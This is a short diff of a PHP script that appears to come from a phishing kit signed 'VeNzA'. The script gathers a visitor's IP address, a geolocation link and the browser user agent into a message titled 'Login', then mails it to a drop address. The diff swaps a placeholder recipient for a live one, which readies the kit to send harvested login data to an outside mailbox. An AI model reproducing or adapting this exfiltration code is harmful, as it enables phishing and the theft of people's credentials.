@@ -16,7 +16,7 @@ $ip = getenv("REMOTE_ADDR");
 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
 	$message .= "User Agent : ".$useragent."\n";
 	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
-	$send = "puturemailhere@yandex.com";
+	$send = "result4life1205@digdig.org";
 	$subject = "Login : $ip";
 	mail($send, $subject, $message); 
 	
